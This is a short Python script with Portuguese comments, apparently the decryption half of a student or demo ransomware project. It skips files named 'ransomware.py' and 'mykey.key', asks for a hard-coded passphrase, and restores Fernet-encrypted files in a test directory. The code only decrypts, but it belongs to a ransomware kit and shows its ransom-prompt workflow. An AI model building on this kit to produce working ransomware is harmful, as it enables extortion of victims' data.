import os
from cryptography.fernet import Fernet

diretorio = r"insira aqui o seu diretorio para teste"  # Diretório onde os arquivos estão localizados

files = []
for file in os.listdir(diretorio):
    if file in ["ransomware.py", "mykey.key", "decrypt.py"]:
        continue
    file_path = os.path.join(diretorio, file)
    if os.path.isfile(file_path):
        files.append(file_path)

print("Encrypted files: ", files)

with open("mykey.key", "rb") as key_file:
    secret_key = key_file.read()

passphrase = "Dunkelheit"  # Senha para descriptografar os arquivos
upassword = input("Enter the password to decrypt your files: ")# comando pra digitar a senha pra descriptografar os arquivos

if upassword == passphrase:#condição para verificar se a senha digitada bate com a senha de descriptografia
    for file_path in files:
        with open(file_path, "rb") as encrypted_file:
            content = encrypted_file.read()#vai abrir o arquivo e ler o conteudo dentro do arquivo
        fernet = Fernet(secret_key)
        try:
            decrypted_content = fernet.decrypt(content)
            with open(file_path, "wb") as decrypted_file:
                decrypted_file.write(decrypted_content)
            print(f"Decryption complete for {file_path}")
        except Exception as e:
            print(f"Failed to decrypt {file_path}: {e}")
else:
    print("Password incorrect, decryption failed")# se caso a senha estiver errada ele vai exibir essa msg de erro
